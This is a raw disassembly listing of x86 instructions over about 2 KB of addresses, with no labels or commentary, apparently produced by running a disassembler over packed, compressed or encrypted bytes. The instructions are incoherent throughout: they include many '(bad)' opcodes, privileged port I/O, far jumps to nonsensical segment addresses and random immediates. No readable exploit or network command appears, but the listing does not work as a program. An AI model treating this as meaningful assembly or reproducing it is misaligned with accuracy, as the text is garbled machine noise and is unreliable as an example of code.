  41cbd5:	add    al,0xb8
  41cbd7:	xor    al,0x44
  41cbd9:	mov    esi,eax
  41cbdb:	jns    0x41cb9d
  41cbdd:	xor    edi,ecx
  41cbdf:	lds    ecx,FWORD PTR [edx-0x27a7da8c]
  41cbe5:	or     eax,0xdb7a8f29
  41cbea:	jmp    FWORD PTR [ebx]
  41cbec:	xor    al,0xf6
  41cbee:	inc    ecx
  41cbef:	xchg   esp,esp
  41cbf1:	test   eax,0xf58cfc54
  41cbf6:	icebp  
  41cbf7:	(bad)  
  41cbf8:	sbb    esi,DWORD PTR [edi]
  41cbfa:	sti    
  41cbfb:	mov    ah,ch
  41cbfd:	outs   dx,BYTE PTR ds:[esi]
  41cbfe:	adc    dl,BYTE PTR [edi-0x7677aab2]
  41cc04:	xor    al,0x3d
  41cc06:	and    BYTE PTR [ebx],cl
  41cc08:	cwde   
  41cc09:	out    0x54,al
  41cc0b:	mov    edi,0xa41be119
  41cc10:	sub    BYTE PTR [ebx-0x76262e64],ah
  41cc16:	sub    ah,BYTE PTR [eax+0x26]
  41cc19:	leave  
  41cc1a:	add    DWORD PTR [ecx+0x58],edi
  41cc1d:	ja     0x41cc8a
  41cc1f:	pop    edx
  41cc20:	inc    ecx
  41cc21:	stc    
  41cc22:	jp     0x41cc2d
  41cc24:	retf   0x53c7
  41cc27:	in     al,0x2c
  41cc29:	push   0xab72097f
  41cc2e:	mov    esi,0xa69b45a
  41cc33:	dec    ecx
  41cc34:	or     eax,0x2f3f315d
  41cc39:	inc    esi
  41cc3a:	and    eax,0x3c872671
  41cc3f:	cmp    al,0x96
  41cc41:	mov    edx,0xb5d66c52
  41cc46:	sub    cl,BYTE PTR [ebp+0x4e09d273]
  41cc4c:	push   esp
  41cc4d:	mov    eax,ds:0x345f3887
  41cc52:	mov    BYTE PTR [ebp+0x6],dh
  41cc55:	pop    esi
  41cc56:	adc    edi,ebp
  41cc58:	ins    BYTE PTR es:[edi],dx
  41cc59:	mov    esi,0xed7ef240
  41cc5e:	push   0xffffff9e
  41cc60:	pushf  
  41cc61:	fidiv  WORD PTR [ebx-0x35]
  41cc64:	scas   eax,DWORD PTR es:[edi]
  41cc65:	xchg   ebx,eax
  41cc66:	mov    ecx,0x869ee7a8
  41cc6b:	daa    
  41cc6c:	xchg   ebp,eax
  41cc6d:	dec    edi
  41cc6e:	jo     0x41cc08
  41cc70:	dec    edi
  41cc71:	ins    DWORD PTR es:[edi],dx
  41cc72:	outs   dx,DWORD PTR ds:[esi]
  41cc73:	xchg   esi,eax
  41cc74:	jne    0x41cc45
  41cc76:	sub    al,dh
  41cc78:	inc    edi
  41cc79:	(bad)  
  41cc7a:	rcl    BYTE PTR [ebx],1
  41cc7c:	push   esp
  41cc7d:	fucomi st,st(2)
  41cc7f:	jae    0x41cc9e
  41cc81:	aaa    
  41cc82:	jmp    0x5548:0x1ee3c3a1
  41cc89:	push   ss
  41cc8a:	enter  0xdb92,0xf0
  41cc8e:	pop    edi
  41cc8f:	pop    ebx
  41cc90:	scas   al,BYTE PTR es:[edi]
  41cc91:	sbb    cl,BYTE PTR [edi+0x24]
  41cc94:	ror    BYTE PTR [edx+0x49],cl
  41cc97:	clc    
	...
  41cd14:	call   0x7fb834e9
  41cd19:	idiv   ecx
  41cd1b:	ficom  WORD PTR [ebp+0x2e]
  41cd1e:	inc    esp
  41cd1f:	and    al,0xdd
  41cd21:	xor    BYTE PTR [edx-0x55],ch
  41cd24:	icebp  
  41cd25:	imul   eax,DWORD PTR [ecx],0x76c00
  41cd2b:	add    BYTE PTR [ecx],dl
  41cd2d:	pop    esp
  41cd2e:	and    ebx,ebp
  41cd30:	dec    ebx
  41cd31:	mov    edi,0xafd2bb24
  41cd36:	inc    edi
  41cd37:	je     0x41cd89
  41cd39:	jns    0x41cd35
  41cd3b:	cli    
  41cd3c:	and    edx,DWORD PTR ds:[eax+0x50f8ecf3]
  41cd43:	xor    al,BYTE PTR [esi-0x26]
  41cd46:	jecxz  0x41ccf7
  41cd48:	retf   0x6c45
  41cd4b:	push   es
  41cd4c:	push   edx
  41cd4d:	cmp    eax,0x4d18a25a
  41cd52:	or     ecx,ebx
  41cd54:	pop    ss
  41cd55:	push   esp
  41cd56:	cdq    
  41cd57:	mov    al,ds:0x260b2310
  41cd5c:	pop    ss
  41cd5d:	rol    BYTE PTR [ebx+0x10120bd4],cl
  41cd63:	or     BYTE PTR [eiz*8-0x3c0004d4],dh
  41cd6a:	mov    WORD PTR [eax-0x27],?
  41cd6d:	pavgw  mm1,QWORD PTR [ebp-0x15b1d24d]
  41cd74:	scas   al,BYTE PTR es:[edi]
  41cd75:	adc    eax,0x5c320bd9
  41cd7a:	pop    esp
  41cd7b:	test   DWORD PTR [edx-0x47],esi
  41cd7e:	push   0x9daefccd
  41cd83:	push   edi
  41cd84:	fild   DWORD PTR [eax-0x3cbd90c0]
  41cd8a:	lds    esi,FWORD PTR [ebx-0x42]
  41cd8d:	or     BYTE PTR [ebp+0xf],ah
  41cd90:	test   DWORD PTR ds:0xf980709c,0xa38f8a1d
  41cd9a:	imul   edx,edx,0xa97533b8
  41cda0:	pop    esp
  41cda1:	xor    DWORD PTR [edx+ebx*2],ebx
  41cda4:	pop    edx
  41cda5:	ds retf 
  41cda7:	into   
  41cda8:	sbb    dh,BYTE PTR [ebx-0x66cbc9dc]
  41cdae:	xor    al,0xed
  41cdb0:	push   0xffffffc4
  41cdb2:	bound  ecx,QWORD PTR [ecx+0xf]
  41cdb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdb6:	xchg   ecx,eax
  41cdb7:	js     0x41cddd
  41cdb9:	test   eax,0xfc424edd
  41cdbe:	mov    bh,0x4b
  41cdc0:	xchg   ebx,eax
  41cdc1:	loop   0x41ce1e
  41cdc3:	ss gs xor ch,BYTE PTR cs:[ebx]
  41cdc8:	adc    bh,BYTE PTR [esi]
  41cdca:	sti    
  41cdcb:	sub    esi,DWORD PTR [esi-0x4b93b38c]
  41cdd1:	std    
  41cdd2:	div    bh
  41cdd4:	adc    eax,0x34cab694
  41cdd9:	mov    al,ds:0x5d46ec27
  41cdde:	lahf   
  41cddf:	loope  0x41cd81
  41cde1:	mov    esi,0xc6a2c5b4
  41cde6:	jb     0x41cd83
  41cde8:	ins    BYTE PTR es:[edi],dx
  41cde9:	lock push 0xffffffa8
  41cdec:	repnz cwde 
  41cdee:	scas   eax,DWORD PTR es:[edi]
  41cdef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdf0:	pop    ebx
  41cdf1:	inc    ebp
  41cdf2:	fwait
  41cdf3:	cmp    eax,DWORD PTR [ebx+esi*4]
  41cdf6:	repz push cs
  41cdf8:	ret    0x8ece
  41cdfb:	stos   BYTE PTR es:[edi],al
  41cdfc:	test   eax,0xcae2e2d1
  41ce01:	outs   dx,BYTE PTR ds:[esi]
  41ce02:	xor    al,cl
  41ce04:	sbb    BYTE PTR [ebx-0x2d7c49e8],0x97
  41ce0b:	xor    esi,DWORD PTR [ebp-0xc]
  41ce0e:	xor    BYTE PTR [eax+esi*2-0x5e],cl
  41ce12:	jp     0x41ce5d
  41ce14:	xor    eax,0x9f0a7d2c
  41ce19:	or     DWORD PTR [ebp+0xb26b56b],ecx
  41ce1f:	nop
  41ce20:	into   
  41ce21:	mov    cl,0x18
  41ce23:	jp     0x41cdbc
  41ce25:	mov    al,ds:0xfb9e3db3
  41ce2a:	pop    edx
  41ce2b:	in     al,dx
  41ce2c:	jl     0x41ce51
  41ce2e:	test   al,0x73
  41ce30:	frstor [eax-0x1e05d469]
  41ce36:	xlat   BYTE PTR ds:[ebx]
  41ce38:	cli    
  41ce39:	cli    
  41ce3a:	leave  
  41ce3b:	xchg   esi,eax
  41ce3c:	call   0xa1ba:0xbeb9cd65
  41ce43:	add    ebp,edi
  41ce45:	mul    DWORD PTR [edi+0x24]
  41ce48:	dec    ebx
  41ce49:	cmp    bh,dh
  41ce4b:	lea    edi,[edi+0x6857ab39]
  41ce51:	dec    BYTE PTR [edx-0x7e]
  41ce54:	add    eax,0xb82489e5
  41ce59:	inc    edi
  41ce5a:	sub    eax,0xf5552569
  41ce5f:	pop    eax
  41ce60:	in     al,0x81
  41ce62:	jmp    0xedee:0x9c020023
  41ce69:	jg     0x41ce4e
  41ce6b:	add    al,0xe1
  41ce6d:	mov    edx,0x94ba585c
  41ce72:	aaa    
  41ce73:	fs sbb al,0x64
  41ce76:	sub    bh,dh
  41ce78:	xor    bh,BYTE PTR [esp+ebx*4+0x14]
  41ce7c:	fbld   TBYTE PTR ds:[ecx]
  41ce7f:	lea    edi,[edx+0x6f]
  41ce82:	ss push es
  41ce84:	push   esi
  41ce85:	jle    0x41ce31
  41ce87:	pop    ebx
  41ce88:	xchg   ebx,eax
  41ce89:	inc    eax
  41ce8a:	mov    edi,0x4ca2f932
  41ce8f:	(bad)  
  41ce90:	mov    ch,0xdd
  41ce92:	and    al,0x78
  41ce94:	aad    0x96
  41ce96:	xchg   DWORD PTR [edi],edx
  41ce98:	adc    bl,BYTE PTR [ecx-0x2c9ef307]
  41ce9e:	and    BYTE PTR [edi+0x1d],al
  41cea1:	xchg   ebx,eax
  41cea2:	adc    BYTE PTR [ebp+0x21],dh
  41cea5:	mov    bh,0x52
  41cea7:	mov    dl,0xe6
  41cea9:	or     edx,DWORD PTR cs:[ebp-0x43]
  41cead:	jo     0x41cea7
  41ceaf:	mov    esi,0x6a03e8f0
  41ceb4:	xor    ecx,DWORD PTR [esi]
  41ceb6:	adc    al,0x8a
  41ceb8:	mov    bl,0x55
  41ceba:	jb     0x41cf0d
  41cebc:	cmp    al,0xe4
  41cebe:	mov    esp,0x247b4d3e
  41cec3:	fst    QWORD PTR [edi]
  41cec5:	rcl    DWORD PTR [edi-0x4efa282b],0x3c
  41cecc:	mov    edi,DWORD PTR [ebx+0x41a23a97]
  41ced2:	jb     0x41ce84
  41ced4:	les    edi,FWORD PTR [ebx+0x2c]
  41ced7:	xor    al,0x76
  41ced9:	mov    dh,0xba
  41cedb:	pushf  
  41cedc:	(bad)  
  41cedd:	ficomp WORD PTR [esi+0x63c7a987]
  41cee3:	add    al,0x7b
  41cee5:	in     eax,0xdc
  41cee7:	xchg   ebp,eax
  41cee8:	pop    ss
  41cee9:	jge    0x41cec1
  41ceeb:	iret   
  41ceec:	out    0x8d,eax
  41ceee:	cmp    dl,bh
  41cef0:	loope  0x41cf2e
  41cef2:	xor    ah,BYTE PTR [esi+0x79650764]
  41cef8:	test   eax,0x62ac1827
  41cefd:	rcr    DWORD PTR [edi+0x43],0xba
  41cf01:	aam    0x9c
  41cf03:	push   0x14
  41cf05:	mov    dh,0x2
  41cf07:	cs mov dh,0x15
  41cf0a:	cmp    BYTE PTR [eax+eax*4+0x255d97ac],dh
  41cf11:	inc    esi
  41cf12:	iret   
  41cf13:	jne    0x41cf2f
  41cf15:	push   esi
  41cf16:	inc    eax
  41cf17:	(bad)  
  41cf18:	ror    esp,cl
  41cf1a:	push   es
  41cf1b:	push   esi
  41cf1c:	aad    0xf1
  41cf1e:	xlat   BYTE PTR ds:[ebx]
  41cf1f:	push   eax
  41cf20:	add    cl,BYTE PTR [ecx]
  41cf22:	jecxz  0x41cfa0
  41cf24:	dec    eax
  41cf25:	inc    ecx
  41cf26:	mov    al,0xfa
  41cf28:	push   edx
  41cf29:	rcr    BYTE PTR [ebp-0x4e874849],cl
  41cf2f:	jg     0x41cecf
  41cf31:	sub    eax,0x5869cbc4
  41cf36:	es mov esi,0x81289271
  41cf3c:	pop    edx
  41cf3d:	popf   
  41cf3e:	in     eax,0x26
  41cf40:	xchg   edi,eax
  41cf41:	mov    ds:0x2791daa4,al
  41cf46:	cmp    al,0x73
  41cf48:	push   ebp
  41cf49:	(bad)  
  41cf4a:	push   ebp
  41cf4b:	shl    BYTE PTR [esp+esi*8],cl
  41cf4e:	repnz mul esp
  41cf51:	cs ret 
  41cf53:	test   eax,0xe5c02abe
  41cf58:	inc    esp
  41cf59:	xor    DWORD PTR [ecx-0x61b5a133],esi
  41cf5f:	(bad)  
  41cf60:	mov    dh,0x89
  41cf62:	sbb    al,0x49
  41cf64:	fwait
  41cf65:	xchg   ecx,eax
  41cf66:	outs   dx,BYTE PTR ds:[esi]
  41cf67:	std    
  41cf68:	fwait
  41cf69:	and    eax,0x48daecbe
  41cf6e:	dec    esp
  41cf6f:	xchg   edi,eax
  41cf70:	ret    0x31b6
  41cf73:	add    esi,DWORD PTR [ebx+0x1b]
  41cf76:	ret    
  41cf77:	in     al,dx
  41cf78:	imul   esp,DWORD PTR ds:0x657e528b,0x5e
  41cf7f:	ret    0xe41a
  41cf82:	pop    eax
  41cf83:	fnsave [eax+0x36]
  41cf86:	pop    edi
  41cf87:	sbb    dh,0x2e
  41cf8a:	sbb    eax,0xaf3ff4f1
  41cf8f:	aas    
  41cf90:	xchg   ebx,eax
  41cf91:	lahf   
  41cf92:	shl    DWORD PTR [ecx-0x6c],0xc0
  41cf96:	push   edi
  41cf97:	add    al,BYTE PTR [edx+0x2f1b65a8]
  41cf9d:	and    ebp,DWORD PTR [eax+ecx*2-0x17118d5b]
  41cfa4:	test   DWORD PTR [eax+0x7e],0xd6e09fb8
  41cfab:	clc    
  41cfac:	aad    0xb8
  41cfae:	push   esp
  41cfaf:	ror    DWORD PTR [edx],cl
  41cfb1:	pushf  
  41cfb2:	cmp    al,BYTE PTR [edx]
  41cfb4:	cdq    
  41cfb5:	or     bh,dl
  41cfb7:	sub    DWORD PTR [esi-0x6d],esi
  41cfba:	inc    ecx
  41cfbb:	into   
  41cfbc:	adc    al,0xdc
  41cfbe:	ins    DWORD PTR es:[edi],dx
  41cfbf:	push   ebp
  41cfc0:	mov    ch,0xa5
  41cfc2:	gs ja  0x41cfd5
  41cfc5:	and    eax,0x83a6fc29
  41cfca:	fsubr  st(2),st
  41cfcc:	mov    bh,0xe2
  41cfce:	ret    0x3ef6
  41cfd1:	sbb    ebp,DWORD PTR [esi]
  41cfd3:	repnz push ds
  41cfd5:	xor    al,0x4d
  41cfd7:	mov    cl,0xe4
  41cfd9:	pop    ecx
  41cfda:	sub    esi,edi
  41cfdc:	sub    al,bh
  41cfde:	(bad)  
  41cfdf:	fdivr  QWORD PTR [ebx+0x6657c564]
  41cfe5:	les    eax,FWORD PTR [ebp-0xb34f29d]
  41cfeb:	push   esp
  41cfec:	inc    esi
  41cfed:	dec    esp
  41cfee:	xchg   ebx,eax
  41cfef:	push   eax
  41cff0:	imul   esp,DWORD PTR [edi-0x43c202f3],0xcd5aab7
  41cffa:	inc    esi
  41cffb:	bswap  edi
  41cffd:	popf   
  41cffe:	inc    esp
  41cfff:	adc    edi,edx
  41d001:	sub    al,0x74
  41d003:	stos   DWORD PTR es:[edi],eax
  41d004:	push   edx
  41d005:	adc    al,0x31
  41d007:	jmp    0xff1ebd70
  41d00c:	and    DWORD PTR [eax],edx
  41d00e:	stos   BYTE PTR es:[edi],al
  41d00f:	inc    ebp
  41d010:	push   eax
  41d011:	jmp    0x54e25cda
  41d016:	daa    
  41d017:	outs   dx,BYTE PTR ds:[esi]
  41d018:	into   
  41d019:	jbe    0x41cff1
  41d01b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d01c:	and    dl,BYTE PTR [edi-0x2c357ad5]
  41d022:	mov    ch,0xec
  41d024:	cld    
  41d025:	dec    edi
  41d026:	mov    ch,dl
  41d028:	pushf  
  41d029:	push   esp
  41d02a:	fistp  QWORD PTR [ebx-0x27a88877]
  41d030:	adc    bh,BYTE PTR [eax+0x5f]
  41d033:	add    esi,DWORD PTR [ebp-0x33]
  41d036:	add    edi,DWORD PTR [edx+0x7bfff309]
  41d03c:	pop    ebx
  41d03d:	dec    ebp
  41d03e:	fwait
  41d03f:	mul    BYTE PTR [edx+0x6e3ae903]
  41d045:	cdq    
  41d046:	xor    al,0x3d
  41d048:	mov    ds:0xc3c702ac,al
  41d04d:	push   cs
  41d04e:	fmul   st,st(6)
  41d050:	loopne 0x41d063
  41d052:	std    
  41d053:	loope  0x41d066
  41d055:	inc    esi
  41d056:	xchg   BYTE PTR [esi-0x54],ah
  41d059:	inc    ebx
  41d05a:	shl    BYTE PTR gs:[edx-0x488445b],0x17
  41d062:	mov    ebp,0xd5f782ba
  41d067:	mov    al,ds:0x4ff770f7
  41d06c:	mov    ecx,0x70ef3229
  41d071:	xor    eax,DWORD PTR [eax]
  41d073:	je     0x41d053
  41d075:	push   edi
  41d076:	fisttp DWORD PTR [eax+0x7d4d2869]
  41d07c:	int    0x67
  41d07e:	add    al,0xd0
  41d080:	std    
  41d081:	pop    ebx
  41d082:	sbb    ebx,esi
  41d084:	adc    ebx,DWORD PTR [eax]
  41d086:	xchg   esi,eax
  41d087:	lods   eax,DWORD PTR ds:[esi]
  41d088:	push   0x8db705ec
  41d08d:	or     BYTE PTR [ebp+edx*8+0x51],cl
  41d091:	fdivr  DWORD PTR [edi-0x55198c25]
  41d097:	dec    eax
  41d098:	jmp    0x2daf5ee
  41d09d:	xor    edi,DWORD PTR [eax]
  41d09f:	(bad)  
  41d0a0:	cmp    ebx,DWORD PTR [edx-0x3f]
  41d0a3:	mov    ebx,0x965c136b
  41d0a8:	in     eax,0xa5
  41d0aa:	shr    DWORD PTR [ebx],cl
  41d0ac:	mov    eax,0xb6b3a7de
  41d0b1:	cwde   
  41d0b2:	(bad)  
  41d0b3:	in     al,dx
  41d0b4:	cli    
  41d0b5:	mov    eax,ds:0x679e593f
  41d0ba:	sahf   
  41d0bb:	sub    BYTE PTR [eax],0x87
  41d0be:	cs pop ecx
  41d0c0:	fldcw  WORD PTR [eax]
  41d0c2:	(bad)  
  41d0c3:	shld   DWORD PTR [ebx+0x134ec8e1],edx,cl
  41d0ca:	jns    0x41d112
  41d0cc:	cmc    
  41d0cd:	inc    esp
  41d0ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0d0:	xor    eax,0xdbc546c1
  41d0d5:	outs   dx,BYTE PTR ds:[esi]
  41d0d6:	or     eax,0xefbe48e5
  41d0db:	mov    cl,0x94
  41d0dd:	mov    ch,0xc7
  41d0df:	xchg   ecx,eax
  41d0e0:	push   esp
  41d0e1:	ficomp WORD PTR [esi+ecx*2]
  41d0e4:	push   ebx
  41d0e5:	xor    edx,eax
  41d0e7:	inc    ecx
  41d0e8:	mov    ds:0x925518c4,eax
  41d0ed:	cmc    
  41d0ee:	cmc    
  41d0ef:	xacquire xchg BYTE PTR [ecx],al
  41d0f2:	fnstsw WORD PTR [ebx-0x339f0ffd]
  41d0f8:	mov    ecx,0x16765803
  41d0fd:	repnz sbb al,0x25
  41d100:	dec    edi
  41d101:	cs mov ah,0xbe
  41d104:	push   eax
  41d105:	fs arpl bp,sp
  41d108:	aaa    
  41d109:	dec    ebx
  41d10a:	xor    eax,0xc6f9fe47
  41d10f:	mov    eax,ds:0x14ad91c
  41d114:	dec    eax
  41d115:	mov    ah,0x4a
  41d117:	arpl   dx,sp
  41d119:	adc    ecx,edx
  41d11b:	sar    BYTE PTR [ebx-0x1],1
  41d11e:	in     eax,dx
  41d11f:	hlt    
  41d120:	inc    ebx
  41d121:	lock test al,0x8e
  41d124:	js     0x41d102
  41d126:	pop    ss
  41d127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d128:	jge    0x41d11d
  41d12a:	iret   
  41d12b:	(bad)  [edi]
  41d12d:	xor    al,0x79
  41d12f:	mov    ebx,0xd44b4027
  41d134:	pop    esi
  41d135:	imul   esp,DWORD PTR [ebp-0x24],0x237dbc7d
  41d13c:	lahf   
  41d13d:	inc    ebx
  41d13e:	dec    edx
  41d13f:	shl    DWORD PTR [ebp-0x1a],1
  41d142:	mov    esi,0x831d4be3
  41d147:	jb     0x41d17e
  41d149:	inc    ebx
  41d14a:	dec    esp
  41d14b:	mov    al,0xdb
  41d14d:	xor    eax,0x19d5e56c
  41d152:	pop    ss
  41d153:	push   esp
  41d154:	int3   
  41d155:	pop    ds
  41d156:	pop    ecx
  41d157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d158:	clc    
  41d159:	mov    WORD PTR [edx+0x62],?
  41d15c:	inc    esi
  41d15d:	lods   eax,DWORD PTR ds:[esi]
  41d15e:	mov    dl,0xf3
  41d160:	aad    0x4f
  41d162:	cld    
  41d163:	iret   
  41d164:	add    dl,BYTE PTR [ebp-0x6f6b2350]
  41d16a:	std    
  41d16b:	sbb    BYTE PTR [ebx-0xc],0x32
  41d16f:	sub    DWORD PTR [ebx+0x2712dc66],ebx
  41d175:	push   edi
  41d176:	sub    DWORD PTR [edx-0x17],edx
  41d179:	or     DWORD PTR [ecx+edi*1-0x587d2e00],esp
  41d180:	xchg   edx,eax
  41d181:	test   DWORD PTR [ebp-0x4caf99b3],eax
  41d187:	and    eax,0x51c957de
  41d18c:	pop    eax
  41d18d:	(bad)  
  41d18e:	jnp    0x41d145
  41d190:	lahf   
  41d191:	clc    
  41d192:	add    al,0x61
  41d194:	pop    edx
  41d195:	sbb    al,0x7e
  41d197:	sub    ch,dh
  41d199:	jno    0x41d175
  41d19b:	(bad)  
  41d19c:	pop    edi
  41d19d:	bound  edi,QWORD PTR [ecx-0x1d]
  41d1a0:	sub    DWORD PTR [esi+ebp*1+0x59],ebx
  41d1a4:	jmp    0x7f6829d5
  41d1a9:	popf   
  41d1aa:	sbb    BYTE PTR cs:[edx],ch
  41d1ad:	mov    DWORD PTR [eax-0x69d26784],ebp
  41d1b3:	hlt    
  41d1b4:	dec    ecx
  41d1b5:	cmp    BYTE PTR [ecx],cl
  41d1b7:	rol    eax,cl
  41d1b9:	and    ebx,DWORD PTR [ebp+0x76a1493]
  41d1bf:	cmp    ebp,DWORD PTR [eax+0x2ce65db5]
  41d1c5:	jmp    0x428fba94
  41d1ca:	es push edi
  41d1cc:	pop    ds
  41d1cd:	clc    
  41d1ce:	push   es
  41d1cf:	nop
  41d1d0:	jns    0x41d168
  41d1d2:	adc    DWORD PTR [edi-0x6273fbcf],esi
  41d1d8:	in     eax,dx
  41d1d9:	fs enter 0x53aa,0x30
  41d1de:	inc    esi
  41d1df:	(bad)  
  41d1e0:	adc    eax,0x81b1756f
  41d1e5:	and    bl,BYTE PTR [eax-0x2260b949]
  41d1eb:	(bad)
  41d1ef:	iret   
  41d1f0:	fidivr WORD PTR ds:0xad1c0c81
  41d1f6:	les    edi,FWORD PTR [eax+0x39]
  41d1f9:	cli    
  41d1fa:	cs ds lahf 
  41d1fd:	xchg   esp,eax
  41d1fe:	(bad)  
  41d1ff:	cmp    bh,al
  41d201:	xor    BYTE PTR [edx],0x9d
  41d204:	call   0x3cced1f3
  41d209:	(bad)  
  41d20a:	inc    edx
  41d20b:	xor    eax,0xdf1ca194
  41d210:	xchg   ebp,eax
  41d211:	mov    cl,0x16
  41d213:	sub    edi,ebp
  41d215:	into   
  41d216:	cli    
  41d217:	stos   BYTE PTR es:[edi],al
  41d218:	test   DWORD PTR [ebx+0x0],edx
  41d21b:	inc    esi
  41d21c:	in     al,0xc6
  41d21e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d21f:	shl    DWORD PTR [edi+ebx*2+0x7b],cl
  41d223:	scas   eax,DWORD PTR es:[edi]
  41d224:	les    esi,FWORD PTR [edi]
  41d226:	lods   al,BYTE PTR ds:[esi]
  41d227:	cmc    
  41d228:	int3   
  41d229:	push   edx
  41d22a:	sbb    eax,0xae3f13a1
  41d22f:	cdq    
  41d230:	lahf   
  41d231:	pop    ss
  41d232:	enter  0xa761,0x41
  41d236:	call   0xaa0b:0xd4af86ae
  41d23d:	les    esi,FWORD PTR [ecx+0x31]
  41d240:	mov    eax,ds:0x9145ad87
  41d245:	xor    edi,DWORD PTR [edx-0xa0beae]
  41d24b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d24c:	inc    edx
  41d24d:	(bad)  
  41d24e:	out    dx,al
  41d24f:	dec    ecx
  41d250:	push   ds
  41d251:	hlt    
  41d252:	retf   0x7d96
  41d255:	pop    edi
  41d256:	clc    
  41d257:	cmc    
  41d258:	mov    dh,0xe9
  41d25a:	daa    
  41d25b:	inc    esi
  41d25c:	std    
  41d25d:	adc    bh,BYTE PTR [ecx]
  41d25f:	icebp  
  41d260:	xchg   BYTE PTR ds:0x6345f3ce,bh
  41d266:	xchg   esi,eax
  41d267:	in     eax,dx
  41d268:	lods   al,BYTE PTR ds:[esi]
  41d269:	sti    
  41d26a:	push   ebx
  41d26b:	dec    eax
  41d26c:	stos   BYTE PTR es:[edi],al
  41d26d:	mov    eax,ds:0x8a15c911
  41d272:	sar    DWORD PTR [esi-0x4b],cl
  41d275:	mov    ebp,0xe05ab2e9
  41d27a:	push   DWORD PTR [ebp+edi*8+0x18]
  41d27e:	ins    DWORD PTR es:[edi],dx
  41d27f:	test   cl,ah
  41d281:	cdq    
  41d282:	xchg   ecx,eax
  41d283:	mov    ds:0xb0abc833,eax
  41d288:	test   eax,0xd1d643d8
  41d28d:	repz xor bl,BYTE PTR [ecx+0x59]
  41d291:	xor    DWORD PTR [ebx+edi*1-0x39],edx
  41d295:	sub    eax,0xa37dd7de
  41d29a:	(bad)  
  41d29b:	dec    eax
  41d29c:	dec    ebp
  41d29d:	mov    ebx,0x34d00753
  41d2a2:	dec    edx
  41d2a3:	or     BYTE PTR [ecx*4+0x73cc6f85],dh
  41d2aa:	dec    edx
  41d2ab:	fwait
  41d2ac:	pop    ds
  41d2ad:	jmp    0x41d315
  41d2af:	out    dx,al
  41d2b0:	add    DWORD PTR [ebx],ecx
  41d2b2:	adc    BYTE PTR [eax+0x28eff8dd],bl
  41d2b8:	lods   eax,DWORD PTR ds:[esi]
  41d2b9:	fdivr  DWORD PTR [esi+0x6ff132fa]
  41d2bf:	xor    eax,0x3bcba456
  41d2c4:	cmp    DWORD PTR [edx+0x33],ecx
  41d2c7:	(bad)  
  41d2c8:	arpl   WORD PTR [edi+0x4a],bx
  41d2cb:	cmp    ah,BYTE PTR [esi+0x45c4f71f]
  41d2d1:	in     eax,0xb6
  41d2d3:	push   ds
  41d2d4:	mov    cl,0xb0
  41d2d6:	sbb    eax,0x4e945b77
  41d2db:	loope  0x41d2c1
  41d2dd:	(bad)  
  41d2de:	and    BYTE PTR [edx],bh
  41d2e0:	out    0xc4,eax
  41d2e2:	pusha  
  41d2e3:	adc    eax,0xfc003ca1
  41d2e8:	inc    edx
  41d2e9:	std    
  41d2ea:	shl    BYTE PTR gs:[ecx-0x13],cl
  41d2ee:	sub    DWORD PTR [ebx+0x12],edx
  41d2f1:	test   WORD PTR [eax],si
  41d2f4:	into   
  41d2f5:	(bad)  
  41d2f6:	mov    al,ds:0x76303cc
  41d2fb:	int    0xa3
  41d2fd:	inc    cl
  41d2ff:	or     al,0xf0
  41d301:	jmp    DWORD PTR [ecx+0x681b2774]
  41d307:	adc    cl,BYTE PTR [edx]
  41d309:	mov    ebp,0x9a8ce0da
  41d30e:	lahf   
  41d30f:	outs   dx,BYTE PTR ds:[esi]
  41d310:	loope  0x41d306
  41d312:	push   0x58
  41d314:	and    eax,0x69f26d31
  41d319:	sub    BYTE PTR [edx],0x4d
  41d31c:	mov    bl,0x5d
  41d31e:	mov    ds:0x444bdb02,eax
  41d323:	pop    ebp
  41d324:	push   ss
  41d325:	adc    BYTE PTR [edi],cl
  41d327:	sti    
  41d328:	sub    bh,BYTE PTR [edx+0x1c41211b]
  41d32e:	fisub  DWORD PTR ds:0xb08e82dc
  41d334:	xor    eax,0xae134717
  41d339:	and    esi,DWORD PTR [edx]
  41d33b:	repnz aad 0xc
  41d33e:	fstp   QWORD PTR [ebp+0x36a7bb1]
  41d344:	fsub   QWORD PTR [ebx+0x55be5b6a]
  41d34a:	jmp    0xbc32a41b
  41d34f:	xchg   BYTE PTR [ecx],bl
  41d351:	or     al,0x58
  41d353:	or     BYTE PTR [ebx+eax*4-0x5],al
  41d357:	push   ebp
  41d358:	mov    eax,ds:0xb9a76808
  41d35d:	lea    ecx,[ebp-0x5de8adb3]
  41d363:	pushf  
  41d364:	imul   ebp,DWORD PTR [ecx+0x724c7ccb],0x9129fb6e
  41d36e:	outs   dx,DWORD PTR ds:[esi]
  41d36f:	mov    esi,0x15c09f87
  41d374:	outs   dx,DWORD PTR ds:[esi]
  41d375:	xor    eax,0x99fe6985
  41d37a:	ins    DWORD PTR es:[edi],dx
  41d37b:	ds aam 0xd6
  41d37e:	inc    esi
  41d37f:	sbb    BYTE PTR [eax],bl
  41d381:	pushf  
  41d382:	or     DWORD PTR [eax],0x66
  41d385:	push   cs
  41d386:	nop
  41d387:	xor    eax,0xad3c1398
  41d38c:	xchg   ebx,eax
  41d38d:	xchg   esi,eax
  41d38e:	and    eax,0x24a0f9a3
  41d393:	mov    ds:0x324e9477,eax
  41d398:	mov    ah,0x58
  41d39a:	pop    ebx
  41d39b:	out    0xf2,eax
  41d39d:	xor    ah,dh
  41d39f:	sar    DWORD PTR [ebx-0x788f34bf],1
  41d3a5:	loopne 0x41d3d4
  41d3a7:	inc    ebx
  41d3a8:	mov    esi,0x12648e1b
  41d3ad:	inc    edx
  41d3ae:	xchg   BYTE PTR ds:0x7ba10595,dl
  41d3b4:	pop    eax
  41d3b5:	dec    esi
  41d3b6:	inc    edx
  41d3b7:	xor    dh,BYTE PTR [ebx-0x12]
  41d3ba:	stos   BYTE PTR es:[edi],al
  41d3bb:	xchg   edx,eax
  41d3bc:	sub    eax,0xf0b002d5
  41d3c1:	repz or bh,bh
  41d3c4:	fsubr  QWORD PTR [esi+0x5998587c]
  41d3ca:	dec    esp
